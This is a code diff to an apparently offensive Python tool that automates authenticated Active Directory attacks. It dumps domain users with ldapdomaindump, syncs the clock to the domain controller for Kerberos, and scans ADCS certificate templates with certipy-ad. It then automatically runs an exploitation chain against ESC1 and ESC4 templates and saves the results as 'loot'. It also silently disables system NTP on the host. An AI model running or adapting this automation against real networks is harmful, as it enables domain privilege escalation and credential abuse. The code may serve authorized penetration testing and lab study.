@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import json
 import re
 import subprocess
 from pathlib import Path
@@ -34,8 +35,12 @@ def _error_lines(text: str) -> str:
     )
 
 
+_ESC_RE = re.compile(r"^ESC\d+")
+_EXPLOITABLE_ESC = {"ESC1", "ESC4"}
+
+
 def _parse_adcs_find(out: str) -> list[tuple[str, str, str]]:
-    """Parse certipy-ad find -stdout output. Returns (ca_name, template_name, esc_variant) for ESC1/ESC4."""
+    """Parse certipy-ad find -stdout output. Returns (ca_name, template_name, esc_variant) for any ESC variant."""
     results: list[tuple[str, str, str]] = []
     current_template: str | None = None
     current_ca: str | None = None
@@ -51,7 +56,7 @@ def _parse_adcs_find(out: str) -> list[tuple[str, str, str]]:
             current_ca = stripped.split(":", 1)[-1].strip()
         elif stripped.startswith("[!] Vulnerabilities"):
             in_vulns = True
-        elif in_vulns and (stripped.startswith("ESC1") or stripped.startswith("ESC4")):
+        elif in_vulns and _ESC_RE.match(stripped):
             esc = stripped.split(":")[0].strip()
             if current_template and current_ca:
                 results.append((current_ca, current_template, esc))
@@ -170,24 +175,61 @@ def _adcs_esc_chain(
         _adcs_esc4_restore(ip, domain, user, pw, template_name, backup_json, runner, findings)
 
 
-def _parse_ldapdomaindump_users(out_dir: str, ws: Workspace) -> int:
-    """Parse domain_users.html from ldapdomaindump and populate ws users.txt. Returns count added."""
-    user_file = Path(out_dir) / "domain_users.html"
-    if not user_file.exists():
-        return 0
-    html = user_file.read_text(errors="replace")
+def _sync_time(ip: str, runner: Runner, findings: Findings, available: set[str]) -> None:
+    if "ntpdate" not in available:
+        findings.note("ntpdate not available — Kerberos may fail if clock skew > 5 min")
+        return
+    subprocess.run(["timedatectl", "set-ntp", "false"], capture_output=True)
+    cmd = ["ntpdate", "-u", ip]
+    findings.cmd(" ".join(cmd))
+    out = runner.run(cmd, "time_sync_ntpdate", timeout=30)
+    first_line = next((l for l in out.splitlines() if l.strip()), "")
+    if first_line:
+        findings.note(f"Time sync to {ip}: {first_line.strip()}")
+    print(f"    [*] Time synced to DC {ip}")
 
-    # Locate the sAMAccountName column index from <th> headers
+
+def _parse_ldapdomaindump_users(out_dir: str, ws: Workspace) -> int:
+    """Parse domain_users JSON (primary) or HTML (fallback) and populate ws users.txt."""
+    out_path = Path(out_dir)
+    count = 0
+
+    # JSON is the most reliable format — try it first
+    json_file = out_path / "domain_users.json"
+    if json_file.exists():
+        try:
+            entries = json.loads(json_file.read_text(errors="replace"))
+            for entry in entries:
+                attrs = entry.get("attributes", {})
+                sam = attrs.get("sAMAccountName", [])
+                if isinstance(sam, list):
+                    sam = sam[0] if sam else ""
+                sam = str(sam).strip()
+                if sam and not sam.endswith("$"):
+                    ws.add_user(sam)
+                    count += 1
+            if count:
+                return count
+        except Exception:
+            pass
+
+    # HTML fallback
+    html_file = out_path / "domain_users.html"
+    if not html_file.exists():
+        return 0
+    html = html_file.read_text(errors="replace")
+
     headers = [re.sub(r"<[^>]+>", "", h).strip().lower()
                for h in re.findall(r"<th[^>]*>(.*?)</th>", html, re.IGNORECASE | re.DOTALL)]
-    sam_idx = next((i for i, h in enumerate(headers) if "samaccountname" in h), 0)
+    sam_idx = next((i for i, h in enumerate(headers) if "samaccountname" in h), None)
+    if sam_idx is None:
+        return 0
 
-    count = 0
     for row in re.finditer(r"<tr[^>]*>(.*?)</tr>", html, re.IGNORECASE | re.DOTALL):
         cells = re.findall(r"<td[^>]*>(.*?)</td>", row.group(1), re.IGNORECASE | re.DOTALL)
         if len(cells) > sam_idx:
             name = re.sub(r"<[^>]+>", "", cells[sam_idx]).strip()
-            if name:
+            if name and not name.endswith("$"):
                 ws.add_user(name)
                 count += 1
     return count
@@ -302,6 +344,9 @@ def _ad_core(
 ) -> None:
     findings.h3("AD Core Enumeration")
 
+    # 0. Time sync — Kerberos requires clock skew < 5 minutes vs DC
+    _sync_time(ip, runner, findings, available)
+
     # 1. ldapdomaindump — authenticated full domain dump; LDAPS fallback if LDAP requires TLS
     if "ldapdomaindump" in available:
         out_dir = str(ws.loot_dir / "ldapdomaindump")
@@ -309,7 +354,7 @@ def _ad_core(
             "ldapdomaindump",
             "-u", f"{domain}\\{user}",
             "-p", pw,
-            "--no-json", "--no-grep",
+            "--no-grep",
             "-o", out_dir,
             f"ldap://{ip}",
         ]
@@ -454,12 +499,41 @@ def _ad_core(
         findings.code_block(_trim(out))
 
         vuln_templates = _parse_adcs_find(out)
+        exploitable = [(ca, tmpl, esc) for ca, tmpl, esc in vuln_templates if esc in _EXPLOITABLE_ESC]
+
         if vuln_templates:
             for ca_name, tmpl, esc in vuln_templates:
                 findings.add_summary(f"ADCS {esc}: {tmpl} via {ca_name}")
-            print(f"    [+] {len(vuln_templates)} vulnerable ADCS template(s) — running chain")
-            for ca_name, tmpl, esc in vuln_templates:
+            print(f"    [+] {len(vuln_templates)} vulnerable ADCS template(s) — {len(exploitable)} exploitable")
+            for ca_name, tmpl, esc in exploitable:
                 _adcs_esc_chain(ip, domain, user, pw, ca_name, tmpl, esc, runner, findings, ws)
+        elif re.search(r"Found \d+ enabled certificate template", out):
+            # -vulnerable returned nothing despite enabled templates existing — run full scan
+            findings.note("No vulnerable templates via -vulnerable filter — running full enabled-template scan")
+            cmd_full = [
+                "certipy-ad", "find",
+                "-u", f"{user}@{domain}",
+                "-p", pw,
+                "-dc-ip", ip,
+                "-enabled",
+                "-stdout",
+                "-output", str(ws.loot_dir / "certipy_full"),
+            ]
+            print(f"    [*] ADCS fallback: full enabled-template scan...")
+            findings.cmd(" ".join(cmd_full))
+            out_full = runner.run(cmd_full, "creds_certipy_enabled", timeout=120)
+            findings.code_block(_trim(out_full))
+            vuln_full = _parse_adcs_find(out_full)
+            exploitable_full = [(ca, tmpl, esc) for ca, tmpl, esc in vuln_full if esc in _EXPLOITABLE_ESC]
+            if vuln_full:
+                for ca_name, tmpl, esc in vuln_full:
+                    findings.add_summary(f"ADCS {esc}: {tmpl} via {ca_name}")
+                print(f"    [+] {len(vuln_full)} vulnerable template(s) in full scan — {len(exploitable_full)} exploitable")
+                for ca_name, tmpl, esc in exploitable_full:
+                    _adcs_esc_chain(ip, domain, user, pw, ca_name, tmpl, esc, runner, findings, ws)
+            else:
+                findings.note("Full ADCS output saved to `loot/certipy_full.json` — review manually for ESC3/ESC9/ESC10")
+                print(f"    [-] No parseable vulnerabilities — check loot/certipy_full.json")
         elif "ESC" in out:
             for line in out.splitlines():
                 if "ESC" in line:
